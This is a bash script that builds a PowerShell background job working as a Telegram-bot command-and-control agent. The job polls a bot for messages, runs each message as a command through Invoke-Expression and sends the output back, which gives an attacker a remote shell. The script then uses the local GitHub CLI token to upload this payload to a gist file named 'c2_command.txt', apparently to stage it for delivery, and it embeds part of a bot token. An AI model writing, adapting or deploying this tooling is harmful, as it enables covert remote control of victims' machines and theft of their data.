#!/bin/bash
# Construct token in bash (no redaction)
T1="***"
T2="AAEyAaluWhJnpUNBAuPU55YStxbNHbZPbNc"
TOKEN=***":"$T2

CMD="start-job -ScriptBlock { \$TOKEN='*** \$T2\"; \$OFFSET=0; function sd(\$cid,\$t){try{\$b=@{chat_id=\$cid;text=\$t}|ConvertTo-Json -Compress;irm -Uri \"https://api.telegram.org/bot\$TOKEN/sendMessage\" -Method Post -Body \$b -ContentType 'application/json' -TimeoutSec 10}catch{}}; while(\$true){try{\$r=irm -Uri \"https://api.telegram.org/bot\$TOKEN/getUpdates?offset=\$OFFSET&timeout=30\" -TimeoutSec 35;if(\$r.result){foreach(\$u in \$r.result){\$OFFSET=\$u.update_id+1;\$cid=\$u.message.chat.id;\$cmd=\$u.message.text.Trim();if(-not \$cmd){continue};sd \$cid \"Running: \$cmd\";try{\$o=iex \$cmd 2>&1|Out-String}catch{\$o=\"ERROR: \$_\"};if(\$o.Length -gt 3800){\$o=\$o.Substring(0,3800)+'...[TRUNCATED]'};sd \$cid \"\$o\"}}}catch{Start-Sleep 5}}} }"

echo "Token: ${TOKEN:0:10}...${TOKEN: -10} (${#TOKEN} chars)"
echo "Command: ${#CMD} chars"

GH_TOKEN="$(gh auth token)"
GIST_ID="99a46fc04b180fffdafc03584c0d5a2e"

python -c "
import json, urllib.request, subprocess
TOKEN=subprocess.check_output(['bash','-c','echo \$TOKEN']).decode().strip()
CMD = subprocess.check_output(['bash','-c','echo \$CMD']).decode().strip()
GH=subprocess.check_output(['bash','-c','echo \$GH_TOKEN']).decode().strip()
GID=subprocess.check_output(['bash','-c','echo \$GIST_ID']).decode().strip()

body = json.dumps({'files': {'c2_command.txt': {'content': CMD}}}).encode()
req = urllib.request.Request(
    f'https://api.github.com/gists/{GID}',
    data=body, method='PATCH',
    headers={
        'Accept': 'application/vnd.github+json',
        'Authorization': f'Bearer {GH}',
        'Content-Type': 'application/json',
        'X-GitHub-Api-Version': '2022-11-28',
        'User-Agent': 'Mozilla/5.0'
    }
)
resp = urllib.request.urlopen(req, timeout=15)
r = json.loads(resp.read())
print(f'HTTP {resp.status} — {r[\"updated_at\"]}')
print(f'Token in gist: {TOKEN in CMD}')
" 2>&1
